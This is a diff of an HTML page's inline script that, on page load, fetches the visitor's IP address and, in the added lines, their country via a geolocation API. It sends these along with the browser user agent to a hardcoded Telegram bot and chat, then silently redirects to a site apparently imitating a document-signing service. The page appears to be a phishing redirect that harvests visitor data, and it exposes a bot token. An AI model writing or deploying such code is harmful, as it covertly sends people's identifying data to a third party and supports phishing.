@@ -6,19 +6,31 @@
     <script>
         const botToken = "7548681470:AAETEnSZdclBzxtInZBZmAeRcquigEwRgu8"; 
         const chatId = "6331127625";
+
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const ip = data.ip;
-                const userAgent = navigator.userAgent;
-                const message = `👤:\nIP: ${ip}\nUser-Agent: ${userAgent}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                    .then(() => {
+
+                fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        const country = locationData.country || "Unknown"; 
+                        const userAgent = navigator.userAgent;
+                        const message = `👤:\nIP: ${ip}\nCountry: ${country}\nUser-Agent: ${userAgent}`;
+                        
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                            .then(() => {
+                                window.location.href = "https://app.fastsigndocu.com/";
+                            });
+                    })
+                    .catch(err => {
+                        console.error('Location fetch error:', err);
                         window.location.href = "https://app.fastsigndocu.com/";
                     });
             })
             .catch(err => {
-                console.error('error:', err);
+                console.error('IP fetch error:', err);
                 window.location.href = "https://app.fastsigndocu.com/";
             });
     </script>
